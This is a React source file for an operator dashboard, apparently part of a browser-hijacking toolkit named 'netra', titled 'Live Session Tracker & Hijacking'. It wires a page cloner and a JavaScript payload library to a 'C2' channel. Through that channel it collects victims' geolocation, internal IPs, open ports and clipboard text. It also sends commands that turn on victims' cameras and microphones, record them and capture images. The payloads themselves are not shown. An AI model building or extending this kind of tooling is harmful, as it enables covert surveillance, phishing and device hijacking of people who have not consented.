
'use client';

import { useState, useEffect, useRef } from 'react';
import { LiveTracker, type TrackedEvent } from '@/components/live-tracker';
import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
import { JavaScriptLibrary, type JsPayload } from '@/components/javascript-library';
import { Separator } from '@/components/ui/separator';
import { useLocalStorage } from '@/hooks/use-local-storage';
import { LocationTracker } from '@/components/location-tracker';
import { InternalNetworkScannerResults } from '@/components/internal-network-scanner-results';
import { PortScannerResults } from '@/components/port-scanner-results';
import { ClipboardMonitor } from '@/components/clipboard-monitor';
import { SessionHistory } from '@/components/session-history';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Webcam, Video, AudioLines, Mic } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/hooks/use-auth';
import { logActivity } from '@/services/activity-log-service';
import Image from 'next/image';

export default function LiveTrackerPage() {
  const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);
  const { value: sessions, setValue: setSessions } = useLocalStorage<Record<string, TrackedEvent[]>>('netra-sessions', {});
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);

  const [location, setLocation] = useState<{lat: number, lon: number} | null>(null);
  const [internalIps, setInternalIps] = useState<string[]>([]);
  const [openPorts, setOpenPorts] = useState<{target: string, port: number}[]>([]);
  const [clipboardContent, setClipboardContent] = useState<string | null>(null);
  const [liveFeedSrc, setLiveFeedSrc] = useState<string | null>(null);
  const [isCameraActive, setIsCameraActive] = useState(false);
  const [isMicActive, setIsMicActive] = useState(false);
  const [isRecording, setIsRecording] = useState<'video' | 'audio' | null>(null);
  
  const { toast } = useToast();
  const { user } = useAuth();
  const channelRef = useRef<BroadcastChannel | null>(null);
  
  const handleSelectPayload = (payload: JsPayload) => {
    setSelectedPayload(payload);
  }
  
  const sessionsMap = new Map(Object.entries(sessions));

  const setSessionsFromMap = (newMap: Map<string, TrackedEvent[]>) => {
    setSessions(Object.fromEntries(newMap.entries()));
  };
  
  const resetStateForSession = () => {
    setLocation(null);
    setInternalIps([]);
    setOpenPorts([]);
    setClipboardContent(null);
    setLiveFeedSrc(null);
    setIsCameraActive(false);
    setIsMicActive(false);
    setIsRecording(null);
  }

  // Centralized event listener for C2 data
  useEffect(() => {
    const c2Channel = new BroadcastChannel('netrax_c2_channel');
    const handleC2Message = (event: MessageEvent<TrackedEvent>) => {
      const newEvent = event.data;
      if (!newEvent.sessionId) return;
      
      setSessions(prevSessions => {
        const currentSessionEvents = prevSessions[newEvent.sessionId] || [];
        const updatedEvents = [...currentSessionEvents, newEvent];
        return {
          ...prevSessions,
          [newEvent.sessionId]: updatedEvents
        };
      });
    };
    c2Channel.addEventListener('message', handleC2Message);
    return () => c2Channel.removeEventListener('message', handleC2Message);
  }, [setSessions]);
  
  // Media control listener
  useEffect(() => {
    channelRef.current = new BroadcastChannel('netrax_c2_channel');
    const handleMediaMessage = (event: MessageEvent) => {
        if (event.data.type === 'media-stream') {
            const { data, sessionId } = event.data;
            if (data.type === 'image-snapshot' && sessionId === selectedSessionId) {
                setLiveFeedSrc(data.snapshot);
                setIsCameraActive(true);
            } else if (data.type === 'status') {
                 if (sessionId === selectedSessionId) {
                    if (data.message === 'Permissions granted.') {
                       setIsCameraActive(true);
                       setIsMicActive(true);
                    } else if (data.message === 'Stream stopped.') {
                        setIsCameraActive(false);
                        setIsMicActive(false);
                        setLiveFeedSrc(null);
                    } else {
                        toast({ variant: 'destructive', title: 'Permission Error', description: `Session ${sessionId} reported: ${data.message}`});
                    }
                }
            }
        }
    };
    channelRef.current.addEventListener('message', handleMediaMessage);
    return () => {
      channelRef.current?.removeEventListener('message', handleMediaMessage);
      channelRef.current?.close();
    };
  }, [selectedSessionId, toast]);

  // Effect to update card visibility based on session data
  useEffect(() => {
    if (selectedSessionId && sessions[selectedSessionId]) {
        const sessionEvents = sessions[selectedSessionId];
        const lastLocationEvent = sessionEvents.slice().reverse().find(e => e.type === 'location' && e.data.latitude);
        setLocation(lastLocationEvent?.data ? { lat: lastLocationEvent.data.latitude, lon: lastLocationEvent.data.longitude } : null);

        const foundIps = sessionEvents.filter(e => e.type === 'internal-ip-found').map(e => e.data.ip);
        setInternalIps([...new Set(foundIps)]);
        
        const foundPorts = sessionEvents.filter(e => e.type === 'port-scan-result').map(e => e.data);
        setOpenPorts(foundPorts);
        
        const lastClipboardEvent = sessionEvents.slice().reverse().find(e => e.type === 'clipboard-read');
        setClipboardContent(lastClipboardEvent?.data.pastedText || null);
    } else {
        resetStateForSession();
    }
  }, [selectedSessionId, sessions]);
  
   useEffect(() => {
    if (!selectedSessionId && sessionsMap.size > 0) {
      setSelectedSessionId(sessionsMap.keys().next().value);
    }
  }, [sessionsMap, selectedSessionId]);

  const sendCommandToSession = (command: string) => {
    if (!selectedSessionId) {
        toast({ variant: 'destructive', title: 'No session selected' });
        return;
    }
    channelRef.current?.postMessage({ type: 'command', sessionId: selectedSessionId, command });
    logActivity({ user: user?.displayName || 'Operator', action: `Sent command: ${command}`, details: `Session: ${selectedSessionId}` });
  };
  
  const handleRecording = (type: 'video' | 'audio') => {
      const command = `start-${type}-record`;
      sendCommandToSession(command);
      setIsRecording(type);
  }
  
  const handleStopRecording = () => {
      if (!isRecording) return;
      const command = `stop-${isRecording}-record`;
      sendCommandToSession(command);
      setIsRecording(null);
  }

  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Live Session Tracker & Hijacking</h1>
        <p className="text-muted-foreground">Inject JS payloads, hijack devices, and monitor real-time user interactions.</p>
      </div>

      <AdvancedPageCloner selectedPayload={selectedPayload}/>
      
      <Separator className="my-4" />
      
      <div className="grid grid-cols-1 xl:grid-cols-3 gap-6 items-start">
        <div className="xl:col-span-2 flex flex-col gap-6">
          <LiveTracker sessions={sessionsMap} selectedSessionId={selectedSessionId} />
          <JavaScriptLibrary onSelectPayload={handleSelectPayload}/>
        </div>
        <div className="xl:col-span-1 flex flex-col gap-6">
          <SessionHistory sessions={sessionsMap} setSessions={setSessionsFromMap} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
          
          {(isCameraActive || isMicActive) && (
            <Card className="bg-primary/10">
              <CardHeader>
                  <CardTitle className="text-lg flex items-center gap-2"><Video className="h-5 w-5"/> Media Control</CardTitle>
                  <Badge variant="destructive" className="w-fit"><Webcam className="mr-2 h-4 w-4"/> LIVE</Badge>
              </CardHeader>
              <CardContent className="space-y-4">
                  <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center">
                      {liveFeedSrc ? <Image src={liveFeedSrc} alt="Live feed" width={640} height={480} className="w-full h-full object-contain"/> : <p className="text-muted-foreground text-sm">Camera feed inactive.</p>}
                  </div>
                  <div className="grid grid-cols-2 gap-2">
                      <Button onClick={() => sendCommandToSession('start-video')} disabled={!selectedSessionId || isCameraActive}>Start Camera</Button>
                      <Button onClick={() => sendCommandToSession('stop-stream')} disabled={!isCameraActive && !isMicActive} variant="destructive">Stop Stream</Button>
                      <Button onClick={() => handleRecording('video')} disabled={!isCameraActive || isRecording === 'video'}>Record Video</Button>
                      <Button onClick={() => handleRecording('audio')} disabled={!isMicActive || isRecording === 'audio'}>Record Audio</Button>
                      <Button onClick={handleStopRecording} disabled={!isRecording} variant="destructive" className="col-span-2">Stop Recording</Button>
                      <Button onClick={() => sendCommandToSession('capture-image')} disabled={!isCameraActive} className="col-span-2">Capture Image</Button>
                  </div>
              </CardContent>
            </Card>
          )}

          {internalIps.length > 0 && <InternalNetworkScannerResults ips={internalIps} />}
          {openPorts.length > 0 && <PortScannerResults ports={openPorts} />}
          {clipboardContent && <ClipboardMonitor content={clipboardContent} />}
          {location && <LocationTracker location={location} />}
        </div>
      </div>
    </div>
  );
}
